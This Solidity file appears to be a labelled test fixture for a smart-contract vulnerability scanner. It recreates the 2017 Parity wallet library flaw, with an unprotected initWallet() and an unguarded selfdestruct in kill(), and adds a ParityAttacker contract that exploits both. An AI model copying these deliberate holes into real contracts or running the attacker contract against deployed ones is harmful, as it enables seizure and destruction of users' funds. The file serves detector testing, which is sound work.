// SPDX-License-Identifier: MIT
// SOURCE: Based on Parity Multisig Wallet (0x863DF6BFa4469f3ead0bE8f9F2AAE51c91A907b4)
// TYPE: Vulnerable
// EXPECTED: Unprotected selfdestruct detection (CRITICAL), Access control (HIGH)
// DATE_ADDED: 2026-01-17
// NOTES: Simplified Parity library vulnerability - November 2017, $280M frozen

pragma solidity ^0.8.0;

/**
 * @title ParityWalletLibrary
 * @notice Simplified version demonstrating the Parity Wallet vulnerability
 * @dev Original vulnerability:
 *      1. initWallet() could be called by anyone (no access control)
 *      2. kill() had no access control
 *      3. Attacker called initWallet() to become owner, then kill() to destroy
 *
 * ATTACK VECTOR:
 * 1. Find the library contract (was deployed once and used by all wallets)
 * 2. Call initWallet() to become the owner (no protection!)
 * 3. Call kill() to selfdestruct the library
 * 4. All wallets using this library are now bricked - $280M frozen forever
 */
contract ParityWalletLibrary {
    address public owner;
    bool public initialized;

    mapping(address => bool) public isOwner;
    address[] public owners;
    uint256 public required;

    event Deposit(address indexed sender, uint256 value);
    event OwnerAdded(address indexed owner);
    event OwnerRemoved(address indexed owner);

    /**
     * @notice VULNERABLE: No access control on initialization
     * @dev Anyone can call this and become the owner
     *      This is exactly what happened - attacker called initWallet()
     */
    function initWallet(address[] calldata _owners, uint256 _required) external {
        // BUG: Only checks if not initialized, but ANYONE can initialize!
        require(!initialized, "Already initialized");

        for (uint256 i = 0; i < _owners.length; i++) {
            isOwner[_owners[i]] = true;
            owners.push(_owners[i]);
        }
        owner = _owners[0];
        required = _required;
        initialized = true;
    }

    /**
     * @notice VULNERABLE: Unprotected selfdestruct
     * @dev No access control modifier - anyone can destroy the contract
     *      This is the critical bug that froze $280M
     */
    function kill() external {
        // BUG: No onlyOwner modifier!
        // Original code had this but it was in the wrong place
        selfdestruct(payable(msg.sender));
    }

    // These functions would normally be protected, but once the contract
    // is destroyed, they're all gone anyway
    function execute(address _to, uint256 _value, bytes calldata _data) external {
        require(isOwner[msg.sender], "Not owner");
        (bool success, ) = _to.call{value: _value}(_data);
        require(success, "Execution failed");
    }

    function addOwner(address _owner) external {
        require(isOwner[msg.sender], "Not owner");
        require(!isOwner[_owner], "Already owner");
        isOwner[_owner] = true;
        owners.push(_owner);
        emit OwnerAdded(_owner);
    }

    function removeOwner(address _owner) external {
        require(isOwner[msg.sender], "Not owner");
        require(isOwner[_owner], "Not an owner");
        isOwner[_owner] = false;
        emit OwnerRemoved(_owner);
    }

    receive() external payable {
        emit Deposit(msg.sender, msg.value);
    }
}

/**
 * @title ParityAttacker
 * @notice Demonstrates how the Parity hack worked
 */
contract ParityAttacker {
    function attack(address library_) external {
        ParityWalletLibrary lib = ParityWalletLibrary(payable(library_));

        // Step 1: Become the owner by calling initWallet
        address[] memory owners = new address[](1);
        owners[0] = address(this);
        lib.initWallet(owners, 1);

        // Step 2: Destroy the library, freezing all funds in wallets using it
        lib.kill();
    }

    receive() external payable {}
}
